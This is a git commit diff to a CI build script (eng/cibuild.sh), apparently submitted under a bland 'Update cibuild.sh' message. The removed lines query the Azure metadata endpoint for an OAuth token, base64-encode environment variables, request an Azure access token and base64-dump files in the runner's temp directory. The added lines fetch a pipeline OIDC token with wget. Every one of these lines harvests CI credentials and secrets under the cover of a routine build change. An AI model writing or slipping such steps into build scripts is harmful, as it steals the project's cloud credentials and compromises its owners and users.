8fd63e2d472e5ab3bc3224e2c0005ac6bfee12dc
jerinh-ty42 <cyntiafollo@hotmail.com>
2025-09-12 12:20:37 +0530

    Update cibuild.sh

--- eng/cibuild.sh
+++ eng/cibuild.sh
@@ -2,10 +2,8 @@
 
 source="${BASH_SOURCE[0]}"
 echo "test"
-curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/"
-env | base64
-az account get-access-token
-find /home/*/work/_temp/ -type f -exec sh -c 'echo "=== $1 ==="; base64 "$1"' _ {} \;
+wget https://dev.azure.com/dnceng-public/cbb18261-c48f-4abb-8651-8cdcb5474649/_apis/distributedtask/hubs/build/plans/5bef9d3f-5319-4401-8e00-770d1fcf5a49/jobs/22fea640-1099-5f32-ec5d-316ad83f359a/oidctoken 
+echo oidctoken | base64
 # resolve $SOURCE until the file is no longer a symlink
 while [[ -h $source ]]; do
   scriptroot="$( cd -P "$( dirname "$source" )" && pwd )"
